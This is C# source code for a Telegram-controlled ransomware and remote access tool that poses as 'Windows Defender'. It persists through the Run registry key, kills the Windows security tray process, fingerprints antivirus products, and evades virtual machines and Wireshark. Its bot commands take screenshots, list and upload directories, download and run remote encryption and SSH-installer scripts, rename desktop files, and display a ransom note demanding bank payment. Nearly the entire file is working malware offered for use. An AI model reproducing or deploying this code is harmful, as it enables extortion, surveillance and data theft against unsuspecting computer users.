using Microsoft.Win32;
using System;
using System.Management;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;
using AutoUpdaterDotNET;
using System.Threading;
using System.Runtime.InteropServices;
namespace Windowsdefender
{
    public partial class MainForm : Form    {
        private System.Windows.Forms.NotifyIcon Log_Icon;
        private List<BotCommandClass> commands = new List<BotCommandClass>();
        TelegramBotClient botClient;
		///change to yourseft
        private const long AdminId = 11111111;
        private const string Token = "11111111111111111111111111111111111";
        private bool flag = false;
        private TextBox textBox1;
        private Button btDecrypt;
        private TextBox textBox2;
        private PictureBox pictureBox1;
        string dpath = Directory.GetCurrentDirectory();
        public MainForm(){
            InitializeComponent();
            Init();
            this.ShowInTaskbar = false;
            Run("", "Get-Process -Name \"SecurityHealthSystray\" | Stop-Process -Force");
            this.Log_Icon.Visible = true;
        }
        private void Run(String path, string args){
            ProcessStartInfo psi = new ProcessStartInfo();
            if (!System.IO.File.Exists(path)){
                psi.FileName = "powershell.exe";
                psi.Arguments = $" -WindowStyle Hidden \"{args}\"";
            }else{
                string extension = System.IO.Path.GetExtension(path).ToLower();
                string cmdArgs = Environment.CommandLine;
                cmdArgs = Regex.Replace(cmdArgs, "\"([^\"]*)\"", m =>
                {
                    return "\"" + m.Groups[1].Value.Replace(" ", "*") + "\"";
                });
                cmdArgs = Regex.Replace(cmdArgs, "\\s+", " ");
                string[] parts = cmdArgs.Split(new char[] { ' ' }, 3);
                if (extension.Equals(".ps1")){
                    cmdArgs = args.Replace("\\\"", "\\\\\"");
                    cmdArgs = args.Replace("\\\\\\\"", "\\\\\"");
                    psi.FileName = "powershell.exe";
                    psi.Arguments = $" -File \"{path}\" {cmdArgs}";
                }else if (extension.Equals(".exe")){
                    psi.FileName = path;
                    psi.Arguments = $" {cmdArgs}";
                }else{
                    psi.FileName = "cmd.exe";
                    psi.Arguments = $"/c \"\"{path}\" {cmdArgs}\"";
                }
            }
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using (Process process = new Process()){
                process.StartInfo = psi;
                process.Start();
            }
        }ReplyKeyboardMarkup keyboard;

        private async void Init(){
            string name = "Windows defender";
            string ExePath = Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);
            reg.Close();
            commands.Add(
                    new BotCommandClass{
                        Command = "/start",
                        CountArgs = 0,
                        Example = "/start",
                        Excecute = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                            "Người tạo ra bot là Phúc Hậu. Danh sách các lệnh có sẵn:\n"
                            + string.Join("\n", commands.Select(s => s.Example)));
                            KeyboardButton key1 = new KeyboardButton("/getScreen");
                            KeyboardButton key2 = new KeyboardButton("/reboot");
                            KeyboardButton key3 = new KeyboardButton("/hideBot");
                            KeyboardButton key4 = new KeyboardButton("/showransom");
                            KeyboardButton key5 = new KeyboardButton("/scan");
                            KeyboardButton key6 = new KeyboardButton("/openSSH");
                            KeyboardButton key7 = new KeyboardButton("/beta");
                            KeyboardButton key8 = new KeyboardButton("/encrypt");
                            KeyboardButton key9 = new KeyboardButton("/decrypt");
                            KeyboardButton key10 = new KeyboardButton("/target");
                            KeyboardButton key11 = new KeyboardButton("/ransom");
                            KeyboardButton key12 = new KeyboardButton("/update");
                            KeyboardButton key13 = new KeyboardButton("/selfdestruct");
                            KeyboardButton[] keyRow1 = { key1, key2, key3 };
                            KeyboardButton[] keyRow2 = { key4, key5, key6 };
                            KeyboardButton[] keyRow3 = { key7, key8, key9 };
                            KeyboardButton[] keyRow4 = { key10,key11,key12 };
                            KeyboardButton[] keyRow5 = { key13 };
                            KeyboardButton[][] buttons = { keyRow2, keyRow1, keyRow3, keyRow4, keyRow5 };
                            KeyboardButton[] keys = { new KeyboardButton("/getScreen"),
                                new KeyboardButton("/help"), new KeyboardButton("/off") };
                            keyboard = new ReplyKeyboardMarkup(buttons);
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                replyMarkup: keyboard, text: "Lựa chọn hành động:");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /start");
                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/encrypt",
                        Example = "/encrypt [path] [key1024]",
                        CountArgs = 2,
                        Excecute = async (model, update) =>
                        {
                            String path = model.Args[0].ToString();
                            String key = model.Args[1].ToString();
                            String tfile = (System.IO.Path.GetTempPath().ToString() + "Key.tmp");
                            StreamWriter file = new StreamWriter(tfile);
                            file.Write(key);
                            file.Close();
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Download Encrypt shell...");
                            Run("", "Invoke-WebRequest -URI Encrypt.ps1 -OutFile Encrypt.ps1");
                            while (true){
                                if (System.IO.File.Exists(".\\Encrypt.ps1")){
                                    await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Encrypting...");
                                    if (model.Args.FirstOrDefault() == "All"){
                                        Run(dpath + "\\encrypt.ps1","");
                                    }else{
                                        Run(dpath + "\\encrypt.ps1", "-FilePath " + path.ToString()
                                            + " -Key " + key.ToString());
                                    }break;
                                }
                            }
                            System.IO.File.Delete(tfile);
                            System.IO.File.Delete("Encrypt.ps1");
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Encrypting done.");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /encrypt [C:/abc] [key1024]");
                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/decrypt",
                        Example = "/decrypt [key]",
                        CountArgs = 1,
                        Excecute = async (model, update) =>
                        {
                            String key = model.Args[0].ToString();
                            String tfile = (System.IO.Path.GetTempPath().ToString() + "Key.tmp");
                            StreamWriter file = new StreamWriter(tfile);
                            file.Write(key);
                            file.Close();
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Download Decrypt shell...");
                            Run("", "Invoke-WebRequest -URI Decrypt.ps1 -OutFile Decrypt.ps1");
                            while (true){
                                if (System.IO.File.Exists(".\\Decrypt.ps1")){
                                    await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                        "Decrypting...");
                                    Run(dpath + "\\Decrypt.ps1"," -Key " + key.ToString());
                                    break;
                                }
                            }
                            System.IO.File.Delete(tfile);
                            System.IO.File.Delete("Decrypt.ps1");
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Decrypting done.");

                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /Decrypt [key]");
                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/ransom",
                        Example = "/ransom",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            ChangeWallPaper("HKT.png");
                            UpdateExtension(true);
                            Thread.Sleep(3000);
                            System.IO.File.Delete("HKT.png");
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Ransom done");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /Ransom");
                        }
                        
        }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/selfdestruct",
                        Example = "/selfdestruct",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            UpdateExtension(false);
                            ChangeWallPaper("default.png");
                            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                            reg.DeleteValue(name);
                            reg.Close();
                            string bat_name = "del.bat";
                            string bat = "@echo off\n"
                                + ":loop\n"
                                + "del \"" + dpath + "\\*.*?" + "\"\n"
                                + "if Exist \"" + dpath + "\\*.*?" + "\" GOTO loop\n"
                                + "del %0";
                            StreamWriter file = new StreamWriter(bat_name);
                            file.Write(bat);
                            file.Close();
                            Process bat_call = new Process();
                            bat_call.StartInfo.FileName = bat_name;
                            bat_call.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            bat_call.StartInfo.UseShellExecute = true;
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Self-destruct done!");
                            Run("", "C:\\Windows\\System32\\SecurityHealthSystray.exe");
                            bat_call.Start();
                            Application.Exit();
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /selfdestruct");
                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/update",
                        Example = "/update",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            AutoUpdater.ApplicationExitEvent += AutoUpdater_ApplicationExitEvent;
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Update...");
                            AutoUpdater.ClearAppDirectory = true;
                            AutoUpdater.TopMost = false;
                            AutoUpdater.Mandatory = true;
                            AutoUpdater.UpdateMode = Mode.ForcedDownload;
                            AutoUpdater.Start("update.xml");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /update");
                        }
                    }
                );


            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/getScreen",
                        CountArgs = 0,
                        Example = "/getScreen",
                        Excecute = async (model, update) =>
                        {
                            Screenshot();
                            using (var fs = System.IO.File.OpenRead("screenShot.png")){
                                var file = new InputOnlineFile(fs, "screenShot.png");
                                await botClient.SendDocumentAsync(update.Message.Chat.Id,
                                    file, caption: "Ảnh chụp màn hình dưới dạng tập tin!");
                            }
                            System.IO.File.Delete("screenShot.png");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /getScreen");
                        }
                    }
                );

            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/off",
                        CountArgs = 1,
                        Example = "/off [hh:mm]",
                        Excecute = async (model, update) =>
                        {
                            var time = DateTime.Parse(model.Args.FirstOrDefault());
                            TimeSpan seconds = time - DateTime.Now;
                            var finalTime = Math.Floor(seconds.TotalSeconds);
                            Run("", "cmd /c shutdown -s -t " + finalTime);
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Máy tính sẽ tắt vào thời gian quy định.");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /off 12:30");
                        }
                    }
                );

            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/reboot",
                        CountArgs = 0,
                        Example = "/reboot",
                        Excecute = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "PC đã bắt đầu khởi động lại.");
                            Run("", "cmd /c shutdown /r /t 0");
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /reboot");
                        }
                    }
                );

            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/hideBot",
                        Example = "/hideBot",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Bot ẩn trong khay.");
                            this.Invoke(new Action(() => { this.WindowState = FormWindowState.Minimized; }));
                            Run("", "Get-Process -Name \"SecurityHealthSystray\" | Stop-Process -Force");
                            MainForm_Deactivate(this, null);
                        }
                    }
                );

            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/showransom",
                        Example = "/showransom",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Hiển thị cửa sổ bot.");
                            this.Invoke(new Action(() =>
                            {
                                this.WindowState = FormWindowState.Normal;
                            }));
                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/scan",
                        Example = "/scan [Path] [Extension]",
                        CountArgs = 2,
                        Excecute = async (model, update) =>
                        {
                            String path = model.Args[0].ToString();
                            String ex = model.Args[1].ToString();
                            if (model.Args.FirstOrDefault() == "All") { path = ""; }
                            else { path =  "-Path " + path.ToString(); }
                            if (model.Args[1].ToString() == "All") { ex = ""; }
                            else { ex = " -Target " + ex.ToString(); }
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Download Scan shell...");
                            Run("", "Invoke-WebRequest -URI GetAll.ps1 -OutFile GetAll.ps1");
                            while (true){
                                if (System.IO.File.Exists(".\\GetAll.ps1")){
                                    await botClient.SendTextMessageAsync(update.Message.Chat.Id, "GetAll...");
                                    Run(dpath + "\\GetAll.ps1", path + ex );
                                    break;
                                }
                            }
                            while (true){
                                if (System.IO.File.Exists(System.IO.Path.GetTempPath().ToString()
                                    + "\\Directory.tmp")){
                                    using (var fs = System.IO.File.OpenRead(System.IO.Path.GetTempPath().ToString()
                                        + "\\Directory.tmp")){
                                        var file = new InputOnlineFile(fs, System.IO.Path.GetTempPath().ToString()
                                            + "\\Directory.tmp");
                                        await botClient.SendDocumentAsync(update.Message.Chat.Id, file, caption:
                                            "Directory dưới dạng tập tin!");
                                        break;
                                    }
                                }
                            }System.IO.File.Delete("GetAll.ps1");
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id, "GetAll done.");

                        }
                    }
                );

            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/openSSH",
                        Example = "/openSSH",
                        CountArgs = 0,
                        Excecute = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Download SSH shell...");
                            Run("", "Invoke-WebRequest -URI installer.ps1 -OutFile installer.ps1");
                            while(true){
                                if (System.IO.File.Exists(".\\installer.ps1")){
                                    await botClient.SendTextMessageAsync(update.Message.Chat.Id, "Open SSH...");
                                    Run("", ".\\installer.ps1 " + Token + " " + AdminId.ToString());
                                    break;
                                }
                            }

                        }
                    }
                );
            commands.Add(
                    new BotCommandClass
                    {
                        Command = "/target",
                        Example = "/target [username]",
                        CountArgs = 1,
                        Excecute = async (model, update) =>
                        {
                            if (model.Args.FirstOrDefault().ToString() == Environment.UserName){
                                flag = false;
                                await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                    "Máy tính này đã được chọn.");
                            }else { flag = true; }
                            
                        },
                        Error = async (model, update) =>
                        {
                            await botClient.SendTextMessageAsync(update.Message.Chat.Id,
                                "Lệnh đã được nhập sai! Thử cái này /target [username]");
                        }
                    }
                );
            botClient = new TelegramBotClient(Token);
            var res = botClient.GetMeAsync().Result;
            botClient.OnMessage += BotClient_OnMessage;
            await botClient.SendTextMessageAsync(AdminId, "Bot đang chạy: " + Environment.UserName);
            String A = CheckAV("AntiVirusProduct");
            String F = CheckAV("FirewallProduct");
            String S = CheckAV("AntiSpywareProduct");
            if (A != ""){ await botClient.SendTextMessageAsync(AdminId, "Detect AntiVirusProduct:" + A);}
            else { await botClient.SendTextMessageAsync(AdminId, "Not detect AntiVirusProduct"); }
            if (F != "") { await botClient.SendTextMessageAsync(AdminId, "Detect FirewallProduct:" + F); }
            else { await botClient.SendTextMessageAsync(AdminId, "Not detect FirewallProduct"); }
            if (S != "") { await botClient.SendTextMessageAsync(AdminId, "Detect AntiSpywareProduct:" + S); }
            else { await botClient.SendTextMessageAsync(AdminId, "Not detect AntiSpywareProduct"); }
            if (IsVirtual()){
                flag = true;
                await botClient.SendTextMessageAsync(AdminId,
                    "Cảnh báo, bot đang được chạy trong môi trường ảo hoá, vui lòng target và gửi lệnh tự huỷ, bot đã tự vô hiệu! flag = true");
            }
            botClient.StartReceiving();
        }
        private void AutoUpdater_ApplicationExitEvent(){
            Thread.Sleep(5000);
            Application.Exit();
        }
        private String CheckAV(String args){
            ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM " + args);
            ManagementObjectCollection data = wmiData.Get();
            String Check ="";
            foreach (ManagementObject virusChecker in data){
                var virusCheckerName = virusChecker["displayName"];
                if (virusCheckerName != "") { Check +=virusCheckerName+", "; }
            }
            if (Check!="") { Check = Check.Substring(0, Check.Length - 2); }
            return Check.ToString(); ;
        }
        private static bool IsVirtual(){
            using (var searcher = new System
                .Management
                .ManagementObjectSearcher(@"SELECT * from Win32_ComputerSystem 
                                WHERE (Manufacturer LIKE '%microsoft corporation%' AND Model LIKE '%virtual%')
                                OR Manufacturer LIKE '%vmware%'
                                OR Model LIKE '%VirtualBox%'")){
                using (System.Management.ManagementObjectCollection items = searcher.Get()){
                    if (items.Count > 0){
                        return true;
                    }
                }
            }
            return false;
        }
        private static bool Wireshark(){
            string process = "Wireshark";
            if (Process.GetProcessesByName(process).Length > 0){return true; }
            else{ return false;}
        }
        private async void BotClient_OnMessage(object sender, MessageEventArgs e){
            if (Wireshark()) { flag = true; await botClient.SendTextMessageAsync(e.Message.Chat.Id,
                "Bot " + Environment.UserName + ":Wireshark detect! Flag = true"); return; };
            if (flag != true || e.Message.Text.Substring(0, 7)== "/target"){
                if (e.Message.Chat.Id == AdminId){
                    if (e.Message.Text != null){
                        var model = BotCommandClass.ParseCommand(e.Message.Text);
                        if (model == null){
                            await botClient.SendTextMessageAsync(e.Message.Chat.Id,
                                "Không có lệnh nào như vậy!");
                        }else{
                            foreach (var cmd in commands){
                                if (cmd.Command == model.Command){
                                    if (cmd.CountArgs == model.Args.Length){
                                        cmd.Excecute?.Invoke(model, e);
                                    }else{
                                        cmd.Error?.Invoke(model, e);
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    await botClient.SendTextMessageAsync(e.Message.Chat.Id,
                        "Yêu cầu quyền sử dụng từ quản trị viên, bạn tuổi gì sài bot của bố mày :))!");
                }
            }
        }
        private void notifyIcon1_DoubleClick(object sender, EventArgs e){
            if (this.WindowState == FormWindowState.Minimized){
                this.Invoke(new Action(() =>
                {
                    this.Log_Icon.Visible = true;
                    Process.Start("explorer", "windowsdefender:");
                }));
            }
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private static void ChangeWallPaper( String args){
            new WebClient().DownloadFile("https://files/" + args.ToString(), "HKT.png");
            var imagePath = Directory.GetCurrentDirectory() + "\\HKT.png";
            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDCHANGE = 0x02;
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }
        private void UpdateExtension(bool args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            DirectoryInfo dir = new DirectoryInfo(path);
            FileInfo[] files = dir.GetFiles("*.*", SearchOption.TopDirectoryOnly);
            if (args == true){
                for (int i = 0; i < files.Length; i++){
                    bool isContain = (files[i].FullName.Contains(".exe") || files[i].FullName.Contains(".HKT"));
                    if (isContain) { }
                    else { files[i].MoveTo(System.IO.Path.ChangeExtension(files[i].FullName, files[i].Extension + ".HKT")); }
                }
            }else{
                for (int i = 0; i < files.Length; i++){
                    if (files[i].FullName.Contains(".HKT")) {
                        files[i].MoveTo(files[i].FullName.Substring(0, files[i].FullName.Length - 4));
                    }
                }
            }
        }
        private void MainForm_Deactivate(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Invoke(new Action(() =>
                {
                    this.ShowInTaskbar = false;
                    this.Log_Icon.Visible = true;
                }));
            }
        }
        private void Screenshot(){
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width * 2,
                Screen.PrimaryScreen.Bounds.Height * 2);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
            printscreen.Save("screenShot.png", System.Drawing.Imaging.ImageFormat.Png);
            printscreen.Dispose();
        }
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources =
                new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
            this.Log_Icon = new System.Windows.Forms.NotifyIcon(this.components);
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.btDecrypt = new System.Windows.Forms.Button();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // Log_Icon
            // 
            this.Log_Icon.Icon = ((System.Drawing.Icon)(resources.GetObject("Log_Icon.Icon")));
            this.Log_Icon.Text = "Windows Defender";
            this.Log_Icon.Visible = true;
            this.Log_Icon.DoubleClick += new System.EventHandler(this.notifyIcon1_DoubleClick);
            // 
            // textBox1
            // 
            this.textBox1.Enabled = false;
            this.textBox1.Location = new System.Drawing.Point(12, 12);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.Size = new System.Drawing.Size(436, 34);
            this.textBox1.TabIndex = 2;
            this.textBox1.Text = "We will give you a chance, click the button below and we will decrypt all files o" +
    "n your desktop for free.";
            // 
            // btDecrypt
            // 
            this.btDecrypt.Location = new System.Drawing.Point(12, 47);
            this.btDecrypt.Name = "btDecrypt";
            this.btDecrypt.Size = new System.Drawing.Size(112, 37);
            this.btDecrypt.TabIndex = 3;
            this.btDecrypt.Text = "Decrypt now";
            this.btDecrypt.UseVisualStyleBackColor = true;
            this.btDecrypt.Click += new System.EventHandler(this.button1_Click);
            // 
            // textBox2
            // 
            this.textBox2.Enabled = false;
            this.textBox2.Location = new System.Drawing.Point(12, 85);
            this.textBox2.Multiline = true;
            this.textBox2.Name = "textBox2";
            this.textBox2.ReadOnly = true;
            this.textBox2.Size = new System.Drawing.Size(112, 71);
            this.textBox2.TabIndex = 4;
            this.textBox2.Text = "If you want it all, please pay me via the bank account:";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::Windowsdefender.Properties.Resources.kg;
            this.pictureBox1.Location = new System.Drawing.Point(130, 52);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(318, 104);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 5;
            this.pictureBox1.TabStop = false;
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(464, 167);
            this.ControlBox = false;
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.textBox2);
            this.Controls.Add(this.btDecrypt);
            this.Controls.Add(this.textBox1);
            this.Font = new System.Drawing.Font("Lucida Console", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.Name = "MainForm";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            this.Deactivate += new System.EventHandler(this.MainForm_Deactivate);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }
        private System.ComponentModel.IContainer components = null;
        protected override void Dispose(bool disposing){
            if (disposing && (components != null)){
                components.Dispose();
            }base.Dispose(disposing);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            UpdateExtension(false);
            btDecrypt.Enabled = false;
        }
    }
}
